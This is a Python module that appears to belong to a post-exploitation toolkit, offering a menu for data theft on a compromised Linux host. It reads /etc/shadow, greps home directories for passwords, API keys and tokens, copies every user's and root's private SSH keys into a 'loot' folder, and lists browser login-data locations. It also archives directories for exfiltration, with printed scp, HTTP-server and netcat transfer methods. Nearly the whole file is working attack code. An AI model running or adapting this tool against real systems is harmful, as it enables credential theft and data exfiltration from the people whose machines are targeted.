#!/usr/bin/env python3
# app/post_exploitation/data_extraction.py

import os
import sys
import subprocess
import shutil
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE
from utils import Logger, pause, InputValidator, clear_screen


class Terminal:
    MARGIN = 4
    
    @staticmethod
    def print_margin(text=""):
        margin = ' ' * Terminal.MARGIN
        if text:
            print(margin + text)
        else:
            print()


class DataExtraction:
    def __init__(self):
        self.output_dir = os.path.join(BASE_DIR, "loot")
        os.makedirs(self.output_dir, exist_ok=True)
    
    def show_header(self):
        clear_screen()
        Terminal.print_margin()
        Terminal.print_margin(f"{C_TITLE}╔════════════════════════════════════════╗{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}║         DATA EXTRACTION TOOLKIT        ║{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}╚════════════════════════════════════════╝{C_RESET}")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_INFO}  Loot Directory: {self.output_dir}{C_RESET}")
        Terminal.print_margin()
    
    def run(self):
        while True:
            self.show_header()
            
            Terminal.print_margin(f"{C_TITLE}┌─ DATA EXTRACTION ───────────────────┐{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  FILE SEARCH:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [1]  Find Interesting Files{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [2]  Search Configuration Files{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [3]  Find Database Files{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [4]  Search Log Files{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  SENSITIVE DATA:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [5]  Search Passwords in Files{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [6]  Extract SSH Keys{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [7]  Browser Data Extraction{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  SYSTEM DATA:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [8]  Network Configuration{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [9]  User Information{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [10] Installed Software{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  TOOLS:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [11] Compress & Exfiltrate{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [12] Base64 Encode File{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_WARN}  [0]  Back{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_TITLE}└─────────────────────────────────────┘{C_RESET}")
            Terminal.print_margin()
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.find_interesting_files()
            elif choice == '2':
                self.search_config_files()
            elif choice == '3':
                self.find_databases()
            elif choice == '4':
                self.search_logs()
            elif choice == '5':
                self.search_passwords()
            elif choice == '6':
                self.extract_ssh_keys()
            elif choice == '7':
                self.browser_data()
            elif choice == '8':
                self.network_config()
            elif choice == '9':
                self.user_info()
            elif choice == '10':
                self.installed_software()
            elif choice == '11':
                self.compress_exfiltrate()
            elif choice == '12':
                self.base64_encode()
            else:
                Logger.error("Invalid choice!")
                pause()
    
    def find_interesting_files(self):
        """Find interesting files"""
        self.show_header()
        Logger.info("Searching for interesting files...")
        Terminal.print_margin()
        
        extensions = ['*.txt', '*.doc', '*.docx', '*.xls', '*.xlsx', 
                     '*.pdf', '*.zip', '*.rar', '*.sql', '*.bak']
        
        Logger.info("File extensions to search:")
        for ext in extensions:
            Terminal.print_margin(f"  • {ext}")
        
        Terminal.print_margin()
        search_path = input(f"{C_INFO}Enter search path (default: /home): {C_RESET}").strip() or "/home"
        
        Logger.info(f"Searching in {search_path}...")
        Terminal.print_margin()
        
        for ext in extensions:
            Logger.info(f"Finding {ext} files...")
            os.system(f"find {search_path} -name '{ext}' -type f 2>/dev/null | head -n 10")
            Terminal.print_margin()
        
        pause()
    
    def search_config_files(self):
        """Search configuration files"""
        self.show_header()
        Logger.info("Searching configuration files...")
        Terminal.print_margin()
        
        config_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/group",
            "/etc/hosts",
            "/etc/ssh/sshd_config",
            "/etc/mysql/my.cnf",
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
        ]
        
        for config in config_files:
            if os.path.exists(config):
                Terminal.print_margin(f"{C_OK}[+] Found: {config}{C_RESET}")
                if input(f"    View? (y/n): ").lower() == 'y':
                    os.system(f"cat {config}")
                    Terminal.print_margin()
            else:
                Terminal.print_margin(f"{C_ERR}[-] Not found: {config}{C_RESET}")
        
        pause()
    
    def find_databases(self):
        """Find database files"""
        self.show_header()
        Logger.info("Searching for database files...")
        Terminal.print_margin()
        
        db_extensions = ['*.db', '*.sqlite', '*.sqlite3', '*.sql', '*.mdb']
        
        search_path = input(f"{C_INFO}Search path (default: /var): {C_RESET}").strip() or "/var"
        
        for ext in db_extensions:
            Logger.info(f"Finding {ext}...")
            os.system(f"find {search_path} -name '{ext}' -type f 2>/dev/null")
            Terminal.print_margin()
        
        pause()
    
    def search_logs(self):
        """Search log files"""
        self.show_header()
        Logger.info("System Log Files:")
        Terminal.print_margin()
        
        log_dirs = [
            "/var/log/",
            "/var/log/apache2/",
            "/var/log/nginx/",
            "/var/log/mysql/",
        ]
        
        for log_dir in log_dirs:
            if os.path.exists(log_dir):
                Logger.info(f"Logs in {log_dir}:")
                os.system(f"ls -lh {log_dir} 2>/dev/null | head -n 10")
                Terminal.print_margin()
        
        pause()
    
    def search_passwords(self):
        """Search for passwords in files"""
        self.show_header()
        Logger.info("Searching for passwords in files...")
        Terminal.print_margin()
        
        search_path = input(f"{C_INFO}Search path (default: /home): {C_RESET}").strip() or "/home"
        
        Logger.warning("This may take a while...")
        Terminal.print_margin()
        
        patterns = ['password', 'passwd', 'pwd', 'pass=', 'api_key', 'apikey', 'secret', 'token']
        
        output_file = os.path.join(self.output_dir, f"passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        for pattern in patterns:
            Logger.info(f"Searching for '{pattern}'...")
            cmd = f"grep -r -i '{pattern}' {search_path} 2>/dev/null | head -n 20 >> {output_file}"
            os.system(cmd)
        
        Logger.info(f"Results saved to: {output_file}")
        
        if os.path.exists(output_file):
            Logger.info("Preview:")
            os.system(f"head -n 20 {output_file}")
        
        pause()
    
    def extract_ssh_keys(self):
        """Extract SSH keys"""
        self.show_header()
        Logger.info("Extracting SSH Keys...")
        Terminal.print_margin()
        
        ssh_dirs = []
        
        # Find all user home directories
        if os.path.exists("/home"):
            for user in os.listdir("/home"):
                ssh_dir = f"/home/{user}/.ssh"
                if os.path.exists(ssh_dir):
                    ssh_dirs.append(ssh_dir)
        
        # Root SSH
        if os.path.exists("/root/.ssh"):
            ssh_dirs.append("/root/.ssh")
        
        if not ssh_dirs:
            Logger.warning("No SSH directories found!")
            pause()
            return
        
        output_dir = os.path.join(self.output_dir, f"ssh_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        os.makedirs(output_dir, exist_ok=True)
        
        for ssh_dir in ssh_dirs:
            Logger.info(f"Checking: {ssh_dir}")
            
            # Copy private keys
            for key_file in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']:
                key_path = os.path.join(ssh_dir, key_file)
                if os.path.exists(key_path):
                    try:
                        shutil.copy2(key_path, output_dir)
                        Logger.info(f"  [+] Copied: {key_file}")
                    except Exception as e:
                        Logger.error(f"  [-] Failed to copy {key_file}: {e}")
        
        Logger.info(f"SSH keys saved to: {output_dir}")
        pause()
    
    def browser_data(self):
        """Extract browser data"""
        self.show_header()
        Logger.info("Browser Data Extraction")
        Terminal.print_margin()
        
        browser_paths = {
            "Chrome": "~/.config/google-chrome/Default/",
            "Firefox": "~/.mozilla/firefox/",
            "Chromium": "~/.config/chromium/Default/",
        }
        
        Logger.info("Common browser data locations:")
        for browser, path in browser_paths.items():
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                Terminal.print_margin(f"{C_OK}[+] {browser}: {expanded}{C_RESET}")
            else:
                Terminal.print_margin(f"{C_ERR}[-] {browser}: Not found{C_RESET}")
        
        Terminal.print_margin()
        Logger.info("Files to extract:")
        Terminal.print_margin("  • History")
        Terminal.print_margin("  • Cookies")
        Terminal.print_margin("  • Login Data")
        Terminal.print_margin("  • Bookmarks")
        
        pause()
    
    def network_config(self):
        """Extract network configuration"""
        self.show_header()
        Logger.info("Network Configuration")
        Terminal.print_margin()
        
        commands = [
            ("IP Configuration", "ip addr show"),
            ("Route Table", "ip route show"),
            ("DNS Servers", "cat /etc/resolv.conf"),
            ("Network Connections", "netstat -tupan"),
            ("ARP Table", "arp -a"),
        ]
        
        output_file = os.path.join(self.output_dir, f"network_config_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        with open(output_file, 'w') as f:
            for title, cmd in commands:
                Logger.info(f"Gathering: {title}")
                f.write(f"\n{'='*50}\n{title}\n{'='*50}\n")
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    f.write(result.stdout)
                    print(result.stdout[:500])  # Preview
                except Exception as e:
                    f.write(f"Error: {e}\n")
                Terminal.print_margin()
        
        Logger.info(f"Network config saved to: {output_file}")
        pause()
    
    def user_info(self):
        """Extract user information"""
        self.show_header()
        Logger.info("User Information")
        Terminal.print_margin()
        
        commands = [
            ("Current User", "whoami"),
            ("User ID", "id"),
            ("All Users", "cat /etc/passwd"),
            ("Groups", "cat /etc/group"),
            ("Logged In Users", "w"),
            ("Last Logins", "last -n 20"),
        ]
        
        for title, cmd in commands:
            Logger.info(f"{title}:")
            os.system(cmd)
            Terminal.print_margin()
        
        pause()
    
    def installed_software(self):
        """List installed software"""
        self.show_header()
        Logger.info("Installed Software")
        Terminal.print_margin()
        
        # Detect package manager
        if shutil.which('dpkg'):
            Logger.info("Using dpkg (Debian/Ubuntu):")
            os.system("dpkg -l | head -n 50")
        elif shutil.which('rpm'):
            Logger.info("Using rpm (RedHat/CentOS):")
            os.system("rpm -qa | head -n 50")
        elif shutil.which('pacman'):
            Logger.info("Using pacman (Arch):")
            os.system("pacman -Q | head -n 50")
        else:
            Logger.warning("No package manager detected!")
        
        pause()
    
    def compress_exfiltrate(self):
        """Compress files for exfiltration"""
        self.show_header()
        Logger.info("Compress & Exfiltrate")
        Terminal.print_margin()
        
        source_dir = input(f"{C_INFO}Directory to compress: {C_RESET}").strip()
        
        if not source_dir or not os.path.exists(source_dir):
            Logger.error("Invalid directory!")
            pause()
            return
        
        archive_name = f"loot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz"
        archive_path = os.path.join(self.output_dir, archive_name)
        
        Logger.info(f"Compressing {source_dir}...")
        cmd = f"tar -czf {archive_path} {source_dir}"
        
        try:
            subprocess.run(cmd, shell=True, check=True)
            Logger.info(f"Archive created: {archive_path}")
            
            # Show size
            size = os.path.getsize(archive_path)
            Logger.info(f"Size: {size / 1024 / 1024:.2f} MB")
            
            Terminal.print_margin()
            Logger.info("Exfiltration methods:")
            Terminal.print_margin("  • SCP: scp file user@host:/path")
            Terminal.print_margin("  • HTTP: python3 -m http.server 8000")
            Terminal.print_margin("  • Base64: base64 file > file.b64")
            Terminal.print_margin("  • Netcat: nc -l -p 1234 > file")
            
        except Exception as e:
            Logger.error(f"Compression failed: {e}")
        
        pause()
    
    def base64_encode(self):
        """Encode file to base64"""
        self.show_header()
        Logger.info("Base64 File Encoder")
        Terminal.print_margin()
        
        file_path = input(f"{C_INFO}File to encode: {C_RESET}").strip()
        
        if not file_path or not os.path.exists(file_path):
            Logger.error("File not found!")
            pause()
            return
        
        output_file = file_path + ".b64"
        
        Logger.info(f"Encoding {file_path}...")
        cmd = f"base64 {file_path} > {output_file}"
        
        try:
            subprocess.run(cmd, shell=True, check=True)
            Logger.info(f"Encoded file: {output_file}")
            Logger.info("Preview:")
            os.system(f"head -n 5 {output_file}")
        except Exception as e:
            Logger.error(f"Encoding failed: {e}")
        
        pause()


if __name__ == "__main__":
    data_ext = DataExtraction()
    data_ext.run()